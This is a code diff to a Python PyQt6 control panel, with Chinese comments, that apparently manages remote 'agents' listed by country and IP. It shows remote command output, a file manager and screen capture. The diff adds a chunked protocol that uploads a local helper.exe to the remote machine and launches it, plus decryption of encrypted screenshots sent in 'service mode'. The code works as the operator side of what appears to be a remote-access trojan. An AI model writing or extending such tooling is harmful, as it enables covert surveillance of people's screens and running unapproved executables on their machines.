@@ -11,9 +11,16 @@ from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
-                             QInputDialog, QFileDialog, QProgressBar, QColorDialog)
+                             QInputDialog, QFileDialog, QProgressBar, QColorDialog,
+                             QMessageBox)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
 from PyQt6.QtGui import QColor, QPixmap
+
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    HAS_AESGCM = True
+except ImportError:
+    HAS_AESGCM = False
 
 WS_OP_CONTINUE = 0x00
 WS_OP_TEXT = 0x01
@@ -24,6 +31,7 @@ WS_OP_PONG = 0x0A
 
 FILE_CHUNK = 32768
 UPLOAD_WINDOW = 8
+HELPER_CHUNK = 32768
 
 DARK_BG = "#000000"
 DARK_SEL_BG = "#003300"
@@ -172,6 +180,12 @@ class ClientSignals(QObject):
     on_disconnect = pyqtSignal(object)
     on_fs = pyqtSignal(object, bytes)
     on_screen = pyqtSignal(object, bytes)
+    on_mode = pyqtSignal(object)
+    on_skey = pyqtSignal(object)
+    on_helper_needed = pyqtSignal(object)
+    on_helper_ack = pyqtSignal(object, bytes)
+    on_helper_ready = pyqtSignal(object)
+    on_helper_err = pyqtSignal(object, str)
 
 
 class ClientSession:
@@ -187,6 +201,12 @@ class ClientSession:
         self._send_lock = threading.Lock()
         self._frag_buf = bytearray()
         self._frag_opcode = 0
+
+        # 新增字段
+        self.is_service_mode = None
+        self.shot_key = None
+        self.helper_uploaded = False
+        self.helper_uploading = False
 
     def send_packet(self, body: bytes) -> bool:
         if not self.connected:
@@ -771,13 +791,14 @@ class FileManagerDialog(QDialog):
 
 
 class ScreenPreviewDialog(QDialog):
-    """接收 agent 的 SCRM/SCRD，重组 JPEG 并显示"""
+    """接收 agent 的 SCRM/SCRD（桌面模式明文）或 SCRX（服务模式密文）"""
+
     def __init__(self, client_session: ClientSession, parent=None):
         super().__init__(parent)
         self.main_window = parent
         self.client = client_session
         self.setWindowTitle(f"屏幕截图 - {client_session.display_name}")
-        self.resize(960, 680)
+        self.resize(960, 720)
 
         self._closing = False
         self._buf = bytearray()
@@ -785,13 +806,14 @@ class ScreenPreviewDialog(QDialog):
         self._chunks_received = 0
         self._chunks_total = 0
         self._last_pixmap = None
+        self._waiting_after_upload = False
 
         lay = QVBoxLayout(self)
 
         info_bar = QHBoxLayout()
         info_bar.addWidget(QLabel(f"🌍 {client_session.country}  📡 {client_session.ip}"))
         info_bar.addStretch()
-        self.btn_refresh = QPushButton("刷新截屏")
+        self.btn_refresh = QPushButton("刷新截图")
         self.btn_refresh.clicked.connect(self.request_screenshot)
         info_bar.addWidget(self.btn_refresh)
         self.btn_save = QPushButton("保存为...")
@@ -802,6 +824,18 @@ class ScreenPreviewDialog(QDialog):
 
         self.status = QLabel("等待截图...")
         lay.addWidget(self.status)
+
+        self.upload_label = QLabel("")
+        self.upload_label.setVisible(False)
+        lay.addWidget(self.upload_label)
+
+        self.upload_bar = QProgressBar()
+        self.upload_bar.setRange(0, 100)
+        self.upload_bar.setValue(0)
+        self.upload_bar.setTextVisible(True)
+        self.upload_bar.setMaximumHeight(18)
+        self.upload_bar.setVisible(False)
+        lay.addWidget(self.upload_bar)
 
         self.image_label = QLabel()
         self.image_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
@@ -818,7 +852,6 @@ class ScreenPreviewDialog(QDialog):
             self.apply_theme(parent.is_dark_mode, parent.fg_color)
 
         log_console(f"截屏窗口打开: {client_session.display_name}")
-        self.request_screenshot()
 
     def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
         if dark:
@@ -840,11 +873,20 @@ class ScreenPreviewDialog(QDialog):
                 }}
                 QPushButton:hover {{ background-color: {DARK_BTN_HOVER}; }}
                 QPushButton:disabled {{ color: {DARK_DISABLED}; }}
+                QProgressBar {{
+                    background-color: {DARK_BG};
+                    color: {fg_color};
+                    border: 1px solid {DARK_BORDER};
+                    text-align: center;
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QProgressBar::chunk {{ background-color: {DARK_PROGRESS_CHUNK}; }}
             """)
         else:
             self.setStyleSheet("")
 
     def request_screenshot(self):
+        """点“刷新截图”按钮：只发 SCRN，等 agent 决定是否需要 helper"""
         if self._closing or not self.client.connected:
             return
         self._buf = bytearray()
@@ -855,8 +897,110 @@ class ScreenPreviewDialog(QDialog):
         self.log("已发送 SCRN")
         self.client.send_packet(b"SCRN")
 
+    def on_helper_needed(self):
+        """agent 回了 HNEED，开始上传 helper"""
+        if self._closing:
+            return
+        if self.client.helper_uploaded:
+            # 已经上传过，理论上不该收到 HNEED，直接再发一次 SCRN
+            self.log("已上传过 helper，重发 SCRN")
+            self.client.send_packet(b"SCRN")
+            return
+        if self.client.helper_uploading:
+            self.log("helper 正在上传，忽略")
+            return
+        self._start_upload_helper()
+
+    def _start_upload_helper(self):
+        helper_path = os.path.join(self.main_window.base_dir, "helper.exe")
+        if not os.path.exists(helper_path):
+            self.log(f"helper.exe 不存在: {helper_path}")
+            self.status.setText("helper.exe 缺失")
+            return
+        size = os.path.getsize(helper_path)
+        self.client.helper_uploading = True
+        self._helper_file = open(helper_path, "rb")
+        self._helper_total = size
+        self._helper_sent = 0
+        self._helper_offset = 0
+        self._helper_ack_pending = False
+        self.upload_label.setText(f"[上传 helper] 0 / {size} 字节")
+        self.upload_label.setVisible(True)
+        self.upload_bar.setValue(0)
+        self.upload_bar.setVisible(True)
+        self.log(f"开始上传 helper, 大小={size}")
+        # 发 HUP0
+        self.client.send_packet(b"HUP0" + struct.pack("<Q", size))
+        # 等 HOK0 再开始分块
+        self._waiting_hok0 = True
+
+    def on_helper_hok0(self):
+        """agent 收到 HUP0 后回 HOK0，开始发第一块"""
+        self._waiting_hok0 = False
+        self._send_next_helper_chunk()
+
+    def _send_next_helper_chunk(self):
+        if self._closing or not self.client.connected:
+            return
+        # 没有在途的块，发下一块
+        if self._helper_ack_pending:
+            return
+        chunk = self._helper_file.read(HELPER_CHUNK)
+        if not chunk:
+            # 全部发完，发 HDON
+            self._helper_file.close()
+            self._helper_file = None
+            self.client.send_packet(b"HDON")
+            self.log("helper 上传完成，等待 HOK0")
+            return
+        offset = self._helper_offset
+        body = b"HDAT" + struct.pack("<Q", offset) + chunk
+        self.client.send_packet(body)
+        self._helper_offset += len(chunk)
+        self._helper_sent += len(chunk)
+        self._helper_ack_pending = True
+        pct = self._helper_sent * 100 // self._helper_total
+        self.upload_bar.setValue(pct)
+        self.upload_label.setText(
+            f"[上传 helper] {self._helper_sent} / {self._helper_total} 字节 ({pct}%)")
+
+    def on_helper_ack(self, offset: bytes):
+        """agent 每块回 HACK"""
+        self._helper_ack_pending = False
+        self._send_next_helper_chunk()
+
+    def on_helper_upload_done(self):
+        """agent 回 HOK0：上传完成"""
+        self.client.helper_uploading = False
+        self.client.helper_uploaded = True
+        self.upload_bar.setValue(100)
+        self.upload_label.setText("[上传 helper] 完成")
+        self.log("helper 上传完成，发送 HSTR 启动")
+        QTimer.singleShot(300, self._send_hstr)
+
+    def _send_hstr(self):
+        if self._closing or not self.client.connected:
+            return
+        self.client.send_packet(b"HSTR")
+        self.log("已发送 HSTR，等待 HOK1")
+
+    def on_helper_ready(self):
+        """agent 回 HOK1：helper 已就绪"""
+        self.log("helper 已就绪，发送 SCRN")
+        self.upload_label.setVisible(False)
+        self.upload_bar.setVisible(False)
+        self.status.setText("helper 就绪，重新发送 SCRN")
+        # 稍微等一下，让 helper 稳定
+        QTimer.singleShot(200, lambda: self.client.send_packet(b"SCRN"))
+
+    def on_helper_err(self, msg: str):
+        self.client.helper_uploading = False
+        self.log(f"helper 错误: {msg}")
+        self.upload_label.setText(f"[错误] {msg}")
+        self.upload_bar.setVisible(False)
+        self.status.setText("helper 错误")
+
     def on_scr_data(self, sess, body: bytes):
-        """由 MainWindow 调用，处理 SCRM / SCRD"""
         if self._closing:
             return
         if len(body) < 4:
@@ -887,6 +1031,42 @@ class ScreenPreviewDialog(QDialog):
                     f"累计 {len(self._buf)}/{self._total} 字节")
                 if self._total > 0 and len(self._buf) >= self._total:
                     self._finalize()
+
+        elif cmd == b"SCRX":
+            # 服务模式：SCRX + 4字节 clen + 12字节 iv + clen字节密文
+            if len(payload) >= 16:
+                clen = struct.unpack("<I", payload[0:4])[0]
+                iv = payload[4:16]
+                cipher = payload[16:16+clen]
+                if len(cipher) != clen:
+                    self.log(f"SCRX 密文长度不匹配: clen={clen}, got={len(cipher)}")
+                    return
+                if not self.client.shot_key:
+                    self.log("没有 shot key，无法解密")
+                    self.status.setText("缺少解密密钥")
+                    return
+                if not HAS_AESGCM:
+                    self.log("cryptography 库未安装，无法解密")
+                    self.status.setText("缺少 cryptography 库")
+                    return
+                try:
+                    aesgcm = AESGCM(self.client.shot_key)
+                    plain = aesgcm.decrypt(iv, cipher, None)
+                except Exception as e:
+                    self.log(f"解密失败: {e}")
+                    self.status.setText("解密失败")
+                    return
+                pix = QPixmap()
+                if not pix.loadFromData(plain, "JPEG"):
+                    self.log("JPEG 解码失败")
+                    self.status.setText("解码失败")
+                    return
+                self._last_pixmap = pix
+                self._display_pixmap()
+                self.status.setText(f"完成 {pix.width()}x{pix.height()}，{len(plain)} 字节")
+                self.log(f"完成（SCRX 解密），尺寸={pix.width()}x{pix.height()}，{len(plain)} 字节")
+                self.btn_save.setEnabled(True)
+                self._buf = bytearray(plain)
 
     def _finalize(self):
         pix = QPixmap()
@@ -954,7 +1134,13 @@ class ClientListModel(QAbstractListModel):
         if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
             return QVariant()
         s = self.items[index.row()]
-        return QVariant(f"{s.display_name} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
+        if s.is_service_mode is True:
+            mode_str = "服务"
+        elif s.is_service_mode is False:
+            mode_str = "桌面"
+        else:
+            mode_str = "未知"
+        return QVariant(f"{s.display_name} | 模式:{mode_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
 
     def add(self, sess):
         self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
@@ -1181,6 +1367,12 @@ class MainWindow(QMainWindow):
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 sess.signals.on_fs.connect(self.handle_session_fs)
                 sess.signals.on_screen.connect(self.handle_session_screen)
+                sess.signals.on_mode.connect(self.handle_session_mode)
+                sess.signals.on_skey.connect(self.handle_session_skey)
+                sess.signals.on_helper_needed.connect(self.handle_helper_needed)
+                sess.signals.on_helper_ack.connect(self.handle_helper_ack)
+                sess.signals.on_helper_ready.connect(self.handle_helper_ready)
+                sess.signals.on_helper_err.connect(self.handle_helper_err)
                 self.client_model.add(sess)
                 self.log(f"[新接入] {display_name}")
                 threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
@@ -1206,6 +1398,38 @@ class MainWindow(QMainWindow):
         dlg = self.open_screen_dialogs.get(sess)
         if dlg is not None and not dlg._closing:
             dlg.on_scr_data(sess, body)
+
+    @pyqtSlot(object)
+    def handle_session_mode(self, sess):
+        self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
+
+    @pyqtSlot(object)
+    def handle_session_skey(self, sess):
+        log_console(f"[SKEY] 收到 {sess.display_name} 的截图密钥")
+
+    @pyqtSlot(object)
+    def handle_helper_needed(self, sess):
+        dlg = self.open_screen_dialogs.get(sess)
+        if dlg is not None and not dlg._closing:
+            dlg.on_helper_needed()
+
+    @pyqtSlot(object, bytes)
+    def handle_helper_ack(self, sess, offset):
+        dlg = self.open_screen_dialogs.get(sess)
+        if dlg is not None and not dlg._closing:
+            dlg.on_helper_ack(offset)
+
+    @pyqtSlot(object)
+    def handle_helper_ready(self, sess):
+        dlg = self.open_screen_dialogs.get(sess)
+        if dlg is not None and not dlg._closing:
+            dlg.on_helper_ready()
+
+    @pyqtSlot(object, str)
+    def handle_helper_err(self, sess, msg):
+        dlg = self.open_screen_dialogs.get(sess)
+        if dlg is not None and not dlg._closing:
+            dlg.on_helper_err(msg)
 
     @pyqtSlot(object)
     def handle_session_disconnect(self, sess):
@@ -1269,25 +1493,58 @@ class MainWindow(QMainWindow):
                                     body = full_body[4:4+body_len]
                                     if len(body) >= 4:
                                         cmd_code = body[0:4]
-                                        if cmd_code == b"PONG":
-                                            sess.last_pong = datetime.now()
-                                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
-                                        elif cmd_code == b"OUTP":
-                                            out_text = body[4:].decode("gbk", errors="replace")
-                                            sess.signals.on_outp.emit(sess, out_text)
-                                        elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
-                                                          b"FPRO", b"FDON", b"FACK", b"FOK0", b"FERR"):
-                                            sess.signals.on_fs.emit(sess, body)
-                                        elif cmd_code in (b"SCRM", b"SCRD"):
-                                            sess.signals.on_screen.emit(sess, body)
-                                        else:
-                                            log_console(f"收到未知命令: {cmd_code!r}, len={len(body)}")
+                                        self._dispatch_packet(sess, cmd_code, body)
             except (OSError, ConnectionResetError) as e:
                 log_console(f"recv 异常: {sess.display_name} {e}")
                 break
         log_console(f"接收线程退出: {sess.display_name}")
         sess.close()
         sess.signals.on_disconnect.emit(sess)
+
+    def _dispatch_packet(self, sess, cmd_code, body):
+        if cmd_code == b"PONG":
+            sess.last_pong = datetime.now()
+            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
+        elif cmd_code == b"OUTP":
+            out_text = body[4:].decode("gbk", errors="replace")
+            sess.signals.on_outp.emit(sess, out_text)
+        elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
+                          b"FPRO", b"FDON", b"FACK", b"FOK0", b"FERR"):
+            sess.signals.on_fs.emit(sess, body)
+        elif cmd_code in (b"SCRM", b"SCRD", b"SCRX"):
+            sess.signals.on_screen.emit(sess, body)
+        elif cmd_code == b"MODE":
+            if len(body) >= 5:
+                sess.is_service_mode = (body[4] == 0x01)
+                sess.signals.on_mode.emit(sess)
+                mode_str = "服务" if sess.is_service_mode else "桌面"
+                log_console(f"[MODE] {sess.display_name} -> {mode_str}")
+        elif cmd_code == b"SKEY":
+            if len(body) >= 36:
+                sess.shot_key = body[4:36]
+                sess.signals.on_skey.emit(sess)
+                log_console(f"[SKEY] {sess.display_name} 密钥已保存")
+        elif cmd_code == b"HNEED":
+            log_console(f"[HNEED] {sess.display_name} 需要 helper")
+            sess.signals.on_helper_needed.emit(sess)
+        elif cmd_code == b"HACK":
+            if len(body) >= 12:
+                offset = body[4:12]
+                sess.signals.on_helper_ack.emit(sess, offset)
+        elif cmd_code == b"HOK0":
+            log_console(f"[HOK0] {sess.display_name} helper 上传完成")
+            dlg = self.open_screen_dialogs.get(sess)
+            if dlg is not None:
+                dlg.on_helper_upload_done()
+        elif cmd_code == b"HOK1":
+            log_console(f"[HOK1] {sess.display_name} helper 就绪")
+            sess.signals.on_helper_ready.emit(sess)
+        elif cmd_code == b"HERR":
+            msg = body[4:].decode("gbk", errors="replace") if len(body) > 4 else "unknown"
+            log_console(f"[HERR] {sess.display_name}: {msg}")
+            sess.signals.on_helper_err.emit(sess, msg)
+        else:
+            log_console(f"收到未知命令: {cmd_code!r}, len={len(body)}")
 
     def start_server(self):
         try:
